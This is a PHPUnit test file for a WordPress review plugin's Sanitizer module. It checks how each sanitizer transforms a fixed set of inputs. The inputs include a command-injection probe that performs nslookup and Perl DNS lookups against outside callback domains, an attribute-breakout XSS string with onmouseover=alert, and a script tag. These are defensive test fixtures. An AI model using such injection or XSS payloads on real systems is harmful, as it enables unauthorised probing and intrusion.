<?php

namespace GeminiLabs\SiteReviews\Tests;

use GeminiLabs\SiteReviews\Modules\Sanitizer;

/**
 * Test case for the Plugin.
 * @group plugin
 */
class SanitizerTest extends \WP_UnitTestCase
{
    protected $testValues;

    public function set_up()
    {
        parent::set_up();
        $this->testValues = [
            'a' => '',
            'b' => 'abc',
            'c' => ['1'],
            'd' => ['a' => false],
            'e' => [13],
            'f' => [0],
            'g' => ['1' => 13],
            'h' => (object) ['b' => true],
            'i' => true,
            'j' => false,
            'k' => '<script>var x = 23;</script>',
            'l' => "<h3>This is a\n title!</h3>",
            'm' => ";(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname('hissstgxwgukmocpc5c80.me'))",
            'n' => 'June 13, 1989',
            'o' => '03-12-2020',
            'p' => '0-0-2020',
            'q' => '2020',
            'r' => 'xx xx',
            's' => '#ax+dex(tomorrow) $200 200% @peter',
            't' => 'this is true',
            'u' => 'single-review full-width" onmouseover="alert(69)',
            'v' => 'matt@wordpress.org',
            'w' => 'https//wordpress.org',
            'x' => 'wordpress.org',
            'y' => 'www.wordpress.org',
            'z' => 'https://wordpress.org',
            'za' => -1,
        ];
    }

    public function testSanitizeArrayInt()
    {
        $sanitized = $this->sanitize('array-int');
        $this->assertEquals($sanitized, [
            'a' => [],
            'b' => [],
            'c' => [1],
            'd' => [],
            'e' => [13],
            'f' => [],
            'g' => [13],
            'h' => [],
            'i' => [1],
            'j' => [],
            'k' => [],
            'l' => [],
            'm' => [],
            'n' => [1989],
            'o' => [],
            'p' => [],
            'q' => [2020],
            'r' => [],
            's' => [],
            't' => [],
            'u' => [],
            'v' => [],
            'w' => [],
            'x' => [],
            'y' => [],
            'z' => [],
            'za' => [],
        ]);
    }

    public function testSanitizeArrayString()
    {
        $sanitized = $this->sanitize('array-string');
        $this->assertEquals($sanitized, [
            'a' => [],
            'b' => ['abc'],
            'c' => ['1'],
            'd' => [],
            'e' => [],
            'f' => [],
            'g' => [],
            'h' => [],
            'i' => ['1'],
            'j' => [],
            'k' => [''],
            'l' => ['This is a title!'],
            'm' => [";(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname('hissstgxwgukmocpc5c80.me'))"],
            'n' => ['June 13', '1989'],
            'o' => ['03-12-2020'],
            'p' => ['0-0-2020'],
            'q' => ['2020'],
            'r' => ['xx xx'],
            's' => ['#ax+dex(tomorrow) $200 200% @peter'],
            't' => ['this is true'],
            'u' => ['single-review full-width" onmouseover="alert(69)'],
            'v' => ['matt@wordpress.org'],
            'w' => ['https//wordpress.org'],
            'x' => ['wordpress.org'],
            'y' => ['www.wordpress.org'],
            'z' => ['https://wordpress.org'],
            'za' => ['-1'],
        ]);
    }

    public function testSanitizeAttr()
    {
        $sanitized = $this->sanitize('attr');
        $this->assertEquals($sanitized, [
            'a' => '',
            'b' => 'abc',
            'c' => '1',
            'd' => '',
            'e' => '13',
            'f' => '0',
            'g' => '13',
            'h' => '',
            'i' => '1',
            'j' => '',
            'k' => '&lt;script&gt;var x = 23;&lt;/script&gt;',
            'l' => "&lt;h3&gt;This is a\n title!&lt;/h3&gt;",
            'm' => ';(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname(&#039;hissstgxwgukmocpc5c80.me&#039;))',
            'n' => 'June 13, 1989',
            'o' => '03-12-2020',
            'p' => '0-0-2020',
            'q' => '2020',
            'r' => 'xx xx',
            's' => '#ax+dex(tomorrow) $200 200% @peter',
            't' => 'this is true',
            'u' => 'single-review full-width&quot; onmouseover=&quot;alert(69)',
            'v' => 'matt@wordpress.org',
            'w' => 'https//wordpress.org',
            'x' => 'wordpress.org',
            'y' => 'www.wordpress.org',
            'z' => 'https://wordpress.org',
            'za' => '-1',
        ]);
    }

    public function testSanitizeAttrClass()
    {
        $sanitized = $this->sanitize('attr-class');
        $this->assertEquals($sanitized, [
            'a' => '',
            'b' => 'abc',
            'c' => '',
            'd' => '',
            'e' => '',
            'f' => '',
            'g' => '',
            'h' => '',
            'i' => '',
            'j' => '',
            'k' => 'scriptvar x script',
            'l' => 'h3This is a titleh3',
            'm' => 'nslookup hit-gx_wgukmocpc5c8ddddcomperl -e gethostbynamehissstgxwgukmocpc5c80me',
            'n' => 'June',
            'o' => '-12-2020',
            'p' => '-0-2020',
            'q' => '',
            'r' => 'xx',
            's' => 'axdextomorrow peter',
            't' => 'this is true',
            'u' => 'single-review full-width onmouseoveralert69',
            'v' => 'mattwordpressorg',
            'w' => 'httpswordpressorg',
            'x' => 'wordpressorg',
            'y' => 'wwwwordpressorg',
            'z' => 'httpswordpressorg',
            'za' => '-1',
        ]);
    }

    public function testSanitizeAttrStyle()
    {
        $sanitized = $this->sanitize('attr-style');
        $this->assertEquals($sanitized, [
            'a' => '',
            'b' => 'abc',
            'c' => '1',
            'd' => '',
            'e' => '13',
            'f' => '0',
            'g' => '13',
            'h' => '',
            'i' => '1',
            'j' => '',
            'k' => 'scriptvar x  23;/script',
            'l' => 'h3this is a title/h3',
            'm' => ';(nslookup hit-gx_wgukmocpc5c8dddd.comperl -e gethostbyname(&#039;hissstgxwgukmocpc5c80.me&#039;))',
            'n' => 'june 13, 1989',
            'o' => '03-12-2020',
            'p' => '0-0-2020',
            'q' => '2020',
            'r' => 'xx xx',
            's' => '#axdex(tomorrow) 200 200% peter',
            't' => 'this is true',
            'u' => 'single-review full-width&quot; onmouseover&quot;alert(69)',
            'v' => 'mattwordpress.org',
            'w' => 'https//wordpress.org',
            'x' => 'wordpress.org',
            'y' => 'www.wordpress.org',
            'z' => 'https://wordpress.org',
            'za' => '-1',
        ]);
    }

    public function testSanitizeCompat()
    {
        //
    }

    public function testSanitizeDate()
    {
        $sanitized = $this->sanitize('date');
        $this->assertEquals($sanitized, [
            'a' => '',
            'b' => '',
            'c' => '',
            'd' => '',
            'e' => '',
            'f' => '',
            'g' => '',
            'h' => '',
            'i' => '',
            'j' => '',
            'k' => '',
            'l' => '',
            'm' => '',
            'n' => '1989-06-13 00:00:00',
            'o' => '2020-12-03 00:00:00',
            'p' => '2019-11-30 00:00:00',
            'q' => wp_date('Y-m-d H:i:s', strtotime('2020')),
            'r' => '',
            's' => '',
            't' => '',
            'u' => '',
            'v' => '',
            'w' => '',
            'x' => '',
            'y' => '',
            'z' => '',
            'za' => wp_date('Y-m-d H:i:s', strtotime('-1')),
        ]);
    }

    public function testSanitizeEmail()
    {
        $sanitized = $this->sanitize('email');
        $this->assertEquals($sanitized, [
            'a' => '',
            'b' => '',
            'c' => '',
            'd' => '',
            'e' => '',
            'f' => '',
            'g' => '',
            'h' => '',
            'i' => '',
            'j' => '',
            'k' => '',
            'l' => '',
            'm' => '',
            'n' => '',
            'o' => '',
            'p' => '',
            'q' => '',
            'r' => '',
            's' => '',
            't' => '',
            'u' => '',
            'v' => 'matt@wordpress.org',
            'w' => '',
            'x' => '',
            'y' => '',
            'z' => '',
            'za' => '',
        ]);
    }

    public function testSanitizeId()
    {
        $sanitized = $this->sanitize('id');
        $this->assertEquals($sanitized['a'], '');
        $this->assertEquals($sanitized['b'], 'abc');
        $this->assertEquals($sanitized['c'], '');
        $this->assertEquals($sanitized['d'], '');
        $this->assertEquals($sanitized['e'], '');
        $this->assertEquals($sanitized['f'], '');
        $this->assertEquals($sanitized['g'], '');
        $this->assertEquals($sanitized['h'], '');
        $this->assertEquals($sanitized['i'], '');
        $this->assertEquals($sanitized['j'], '');
        $this->assertEquals($sanitized['l'], 'thisisatitle');
        $this->assertEquals($sanitized['m'], 'nslookuphit-gx_wgukmocpc5c8ddddc');
        $this->assertEquals($sanitized['n'], 'june131989');
        $this->assertEquals($sanitized['o'], '-12-2020');
        $this->assertEquals($sanitized['p'], '-0-2020');
        $this->assertEquals($sanitized['q'], '');
        $this->assertEquals($sanitized['r'], 'xxxx');
        $this->assertEquals($sanitized['s'], 'axdextomorrow200200peter');
        $this->assertEquals($sanitized['t'], 'thisistrue');
        $this->assertEquals($sanitized['u'], 'single-reviewfull-widthonmouseov');
        $this->assertEquals($sanitized['v'], 'mattwordpressorg');
        $this->assertEquals($sanitized['w'], 'httpswordpressorg');
        $this->assertEquals($sanitized['x'], 'wordpressorg');
        $this->assertEquals($sanitized['y'], 'wwwwordpressorg');
        $this->assertEquals($sanitized['z'], 'httpswordpressorg');
        $this->assertEquals($sanitized['za'], '-1');
    }

    public function testSanitizeIdHash()
    {
        $sanitized = $this->sanitize('id-hash');
        $pattern = '/glsr_([a-z0-9]{8})/';
        $this->assertMatchesRegularExpression($pattern, $sanitized['a']);
        $this->assertEquals($sanitized['b'], 'abc');
        $this->assertMatchesRegularExpression($pattern, $sanitized['c']);
        $this->assertMatchesRegularExpression($pattern, $sanitized['d']);
        $this->assertMatchesRegularExpression($pattern, $sanitized['e']);
        $this->assertMatchesRegularExpression($pattern, $sanitized['f']);
        $this->assertMatchesRegularExpression($pattern, $sanitized['g']);
        $this->assertMatchesRegularExpression($pattern, $sanitized['h']);
        $this->assertMatchesRegularExpression($pattern, $sanitized['i']);
        $this->assertMatchesRegularExpression($pattern, $sanitized['j']);
        $this->assertEquals($sanitized['l'], 'thisisatitle');
        $this->assertEquals($sanitized['m'], 'nslookuphit-gx_wgukmocpc5c8ddddc');
        $this->assertEquals($sanitized['n'], 'june131989');
        $this->assertEquals($sanitized['o'], '-12-2020');
        $this->assertEquals($sanitized['p'], '-0-2020');
        $this->assertMatchesRegularExpression($pattern, $sanitized['q']);
        $this->assertEquals($sanitized['r'], 'xxxx');
        $this->assertEquals($sanitized['s'], 'axdextomorrow200200peter');
        $this->assertEquals($sanitized['t'], 'thisistrue');
        $this->assertEquals($sanitized['u'], 'single-reviewfull-widthonmouseov');
        $this->assertEquals($sanitized['v'], 'mattwordpressorg');
        $this->assertEquals($sanitized['w'], 'httpswordpressorg');
        $this->assertEquals($sanitized['x'], 'wordpressorg');
        $this->assertEquals($sanitized['y'], 'wwwwordpressorg');
        $this->assertEquals($sanitized['z'], 'httpswordpressorg');
        $this->assertEquals($sanitized['za'], '-1');
    }

    public function testSanitizeJson()
    {
        //
    }

    public function testSanitizeKey()
    {
        $sanitized = $this->sanitize('key');
        $this->assertEquals($sanitized, [
            'a' => '',
            'b' => 'abc',
            'c' => '1',
            'd' => '',
            'e' => '13',
            'f' => '0',
            'g' => '13',
            'h' => '',
            'i' => '1',
            'j' => '',
            'k' => '',
            'l' => 'thisisatitle',
            'm' => 'nslookuphit_gx_wgukmocpc5c8ddddc',
            'n' => 'june131989',
            'o' => '03_12_2020',
            'p' => '0_0_2020',
            'q' => '2020',
            'r' => 'xxxx',
            's' => 'axdextomorrow200200peter',
            't' => 'thisistrue',
            'u' => 'single_reviewfull_widthonmouseov',
            'v' => 'mattwordpressorg',
            'w' => 'httpswordpressorg',
            'x' => 'wordpressorg',
            'y' => 'wwwwordpressorg',
            'z' => 'httpswordpressorg',
            'za' => '_1',
        ]);
    }

    public function testSanitizeMax()
    {
        $sanitized = $this->sanitize('max:21');
        $this->assertEquals($sanitized, [
            'a' => 0,
            'b' => 0,
            'c' => 0,
            'd' => 0,
            'e' => 0,
            'f' => 0,
            'g' => 0,
            'h' => 0,
            'i' => 1,
            'j' => 0,
            'k' => 0,
            'l' => 0,
            'm' => 0,
            'n' => 0,
            'o' => 0,
            'p' => 0,
            'q' => 21,
            'r' => 0,
            's' => 0,
            't' => 0,
            'u' => 0,
            'v' => 0,
            'w' => 0,
            'x' => 0,
            'y' => 0,
            'z' => 0,
            'za' => -1,
        ]);
    }

    public function testSanitizeMin()
    {
        $sanitized = $this->sanitize('min:13');
        $this->assertEquals($sanitized, [
            'a' => 13,
            'b' => 13,
            'c' => 13,
            'd' => 13,
            'e' => 13,
            'f' => 13,
            'g' => 13,
            'h' => 13,
            'i' => 13,
            'j' => 13,
            'k' => 13,
            'l' => 13,
            'm' => 13,
            'n' => 13,
            'o' => 13,
            'p' => 13,
            'q' => 2020,
            'r' => 13,
            's' => 13,
            't' => 13,
            'u' => 13,
            'v' => 13,
            'w' => 13,
            'x' => 13,
            'y' => 13,
            'z' => 13,
            'za' => 13,
        ]);
    }

    public function testSanitizeMinMax()
    {
        $sanitized = $this->sanitize('min:3|max:50');
        $this->assertEquals($sanitized, [
            'a' => 3,
            'b' => 3,
            'c' => 3,
            'd' => 3,
            'e' => 3,
            'f' => 3,
            'g' => 3,
            'h' => 3,
            'i' => 3,
            'j' => 3,
            'k' => 3,
            'l' => 3,
            'm' => 3,
            'n' => 3,
            'o' => 3,
            'p' => 3,
            'q' => 50,
            'r' => 3,
            's' => 3,
            't' => 3,
            'u' => 3,
            'v' => 3,
            'w' => 3,
            'x' => 3,
            'y' => 3,
            'z' => 3,
            'za' => 3,
        ]);
    }

    public function testSanitizeName()
    {
        $sanitized = $this->sanitize('name');
        $this->assertEquals($sanitized, [
            'a' => '',
            'b' => 'abc',
            'c' => '',
            'd' => '',
            'e' => '',
            'f' => '',
            'g' => '',
            'h' => '',
            'i' => '',
            'j' => '',
            'k' => '',
            'l' => 'thisisatitle',
            'm' => 'nslookuphit-gx_wgukmocpccddddcomperl-egethostbynamehissstgxwgukmocpccme',
            'n' => 'june',
            'o' => '',
            'p' => '',
            'q' => '',
            'r' => 'xxxx',
            's' => 'axdextomorrowpeter',
            't' => 'thisistrue',
            'u' => 'single-reviewfull-widthonmouseoveralert',
            'v' => 'mattwordpressorg',
            'w' => 'httpswordpressorg',
            'x' => 'wordpressorg',
            'y' => 'wwwwordpressorg',
            'z' => 'httpswordpressorg',
            'za' => '',
        ]);
    }

    public function testSanitizeNumeric()
    {
        $sanitized = $this->sanitize('numeric');
        $this->assertEquals($sanitized, [
            'a' => '',
            'b' => '',
            'c' => '',
            'd' => '',
            'e' => '',
            'f' => '',
            'g' => '',
            'h' => '',
            'i' => '',
            'j' => '',
            'k' => '',
            'l' => '',
            'm' => '',
            'n' => '',
            'o' => '',
            'p' => '',
            'q' => '2020',
            'r' => '',
            's' => '',
            't' => '',
            'u' => '',
            'v' => '',
            'w' => '',
            'x' => '',
            'y' => '',
            'z' => '',
            'za' => '-1',
        ]);
    }

    public function testSanitizePostIds()
    {
        //
    }

    public function testSanitizeRating()
    {
        add_filter('site-reviews/const/MAX_RATING', function () { return 5; });
        add_filter('site-reviews/const/MIN_RATING', '__return_zero');
        $sanitized = $this->sanitize('rating');
        $this->assertEquals($sanitized, [
            'a' => 0,
            'b' => 0,
            'c' => 0,
            'd' => 0,
            'e' => 0,
            'f' => 0,
            'g' => 0,
            'h' => 0,
            'i' => 1,
            'j' => 0,
            'k' => 0,
            'l' => 0,
            'm' => 0,
            'n' => 0,
            'o' => 0,
            'p' => 0,
            'q' => 5,
            'r' => 0,
            's' => 0,
            't' => 0,
            'u' => 0,
            'v' => 0,
            'w' => 0,
            'x' => 0,
            'y' => 0,
            'z' => 0,
            'za' => 0,
        ]);
    }

    public function testSanitizeRegex()
    {
        //
    }

    public function testSanitizeSlug()
    {
        $sanitized = $this->sanitize('slug');
        $this->assertEquals($sanitized, [
            'a' => '',
            'b' => 'abc',
            'c' => '1',
            'd' => '',
            'e' => '13',
            'f' => '0',
            'g' => '13',
            'h' => '',
            'i' => '1',
            'j' => '',
            'k' => '',
            'l' => 'this-is-a-title',
            'm' => 'nslookup-hit-gx_wgukmocpc5c8dddd-comperl-e-gethostbynamehissstgxwgukmocpc5c80-me',
            'n' => 'june-13-1989',
            'o' => '03-12-2020',
            'p' => '0-0-2020',
            'q' => '2020',
            'r' => 'xx-xx',
            's' => 'axdextomorrow-200-200-peter',
            't' => 'this-is-true',
            'u' => 'single-review-full-width-onmouseoveralert69',
            'v' => 'mattwordpress-org',
            'w' => 'https-wordpress-org',
            'x' => 'wordpress-org',
            'y' => 'www-wordpress-org',
            'z' => 'https-wordpress-org',
            'za' => '1',
        ]);
    }

    public function testSanitizeTermIds()
    {
        //
    }

    public function testSanitizeText()
    {
        $sanitized = $this->sanitize('text');
        $this->assertEquals($sanitized, [
            'a' => '',
            'b' => 'abc',
            'c' => '1',
            'd' => '',
            'e' => '13',
            'f' => '0',
            'g' => '13',
            'h' => '',
            'i' => '1',
            'j' => '',
            'k' => '',
            'l' => 'This is a title!',
            'm' => ";(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname('hissstgxwgukmocpc5c80.me'))",
            'n' => 'June 13, 1989',
            'o' => '03-12-2020',
            'p' => '0-0-2020',
            'q' => '2020',
            'r' => 'xx xx',
            's' => '#ax+dex(tomorrow) $200 200% @peter',
            't' => 'this is true',
            'u' => 'single-review full-width" onmouseover="alert(69)',
            'v' => 'matt@wordpress.org',
            'w' => 'https//wordpress.org',
            'x' => 'wordpress.org',
            'y' => 'www.wordpress.org',
            'z' => 'https://wordpress.org',
            'za' => '-1',
        ]);
    }

    public function testSanitizeTextHtml()
    {
        //
    }

    public function testSanitizeTextMultiline()
    {
        $sanitized = $this->sanitize('text-multiline');
        $this->assertEquals($sanitized, [
            'a' => '',
            'b' => 'abc',
            'c' => '1',
            'd' => '',
            'e' => '13',
            'f' => '0',
            'g' => '13',
            'h' => '',
            'i' => '1',
            'j' => '',
            'k' => '',
            'l' => "This is a\n title!",
            'm' => ";(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname('hissstgxwgukmocpc5c80.me'))",
            'n' => 'June 13, 1989',
            'o' => '03-12-2020',
            'p' => '0-0-2020',
            'q' => '2020',
            'r' => 'xx xx',
            's' => '#ax+dex(tomorrow) $200 200% @peter',
            't' => 'this is true',
            'u' => 'single-review full-width" onmouseover="alert(69)',
            'v' => 'matt@wordpress.org',
            'w' => 'https//wordpress.org',
            'x' => 'wordpress.org',
            'y' => 'www.wordpress.org',
            'z' => 'https://wordpress.org',
            'za' => '-1',
        ]);
    }

    public function testSanitizeTextPost()
    {
        //
    }

    public function testSanitizeUrl()
    {
        $sanitized = $this->sanitize('url');
        $this->assertEquals($sanitized, [
            'a' => '',
            'b' => 'https://abc',
            'c' => 'https://1',
            'd' => '',
            'e' => 'https://13',
            'f' => 'https://0',
            'g' => 'https://13',
            'h' => '',
            'i' => 'https://1',
            'j' => '',
            'k' => '',
            'l' => '',
            'm' => '',
            'n' => '',
            'o' => 'https://03-12-2020',
            'p' => 'https://0-0-2020',
            'q' => 'https://2020',
            'r' => '',
            's' => '',
            't' => '',
            'u' => '',
            'v' => 'https://matt@wordpress.org',
            'w' => 'https://https//wordpress.org',
            'x' => 'https://wordpress.org',
            'y' => 'https://www.wordpress.org',
            'z' => 'https://wordpress.org',
            'za' => '',
        ]);
    }

    public function testSanitizeUserEmail()
    {
        //
    }

    public function testSanitizeUserId()
    {
        //
    }

    public function testSanitizeUserIds()
    {
        //
    }

    public function testSanitizeUserName()
    {
        //
    }

    public function testSanitizeVersion()
    {
        //
    }

    protected function sanitize(string $sanitizer)
    {
        $sanitizers = array_fill_keys(array_keys($this->testValues), $sanitizer);
        return (new Sanitizer($this->testValues, $sanitizers))->run();
    }
}
